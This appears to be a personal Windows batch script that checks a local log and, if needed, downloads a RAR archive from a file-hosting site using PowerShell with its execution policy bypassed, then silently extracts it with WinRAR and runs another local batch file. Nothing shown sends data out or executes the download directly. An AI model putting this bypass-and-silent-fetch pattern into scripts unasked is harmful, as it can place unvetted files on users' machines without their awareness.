@echo off 
 
set urls=https://st7.ranoz.gg/QdoKtLb6-2692vip3-av.rar 
call "%USERPROFILE%\Desktop\dow-code\client-code\checklog.bat" "TAI_FILE_BACKUP-06/10/2025-13:38" 
if %errorlevel% equ 0 ( 
   echo done 
) else ( 
    call "%USERPROFILE%\Desktop\dow-code\client-code\addlog.bat" "TAI_FILE_BACKUP-06/10/2025-13:38" 
    powershell -NoProfile -ExecutionPolicy Bypass -Command "& {Invoke-WebRequest -Uri 'https://st7.ranoz.gg/QdoKtLb6-2692vip3-av.rar' -OutFile '%USERPROFILE%\Downloads\2692vip3-av.rar'}" 
    "C:\Program Files\WinRAR\WinRAR.exe" x -ibck -o+ "%USERPROFILE%\Downloads\2692vip3-av.rar" "%USERPROFILE%\Downloads\" 
    call "%USERPROFILE%\Desktop\dow-code\test-something\asset\backup-LD.bat" 
    ) 
    timeout /t 5 
    exit 
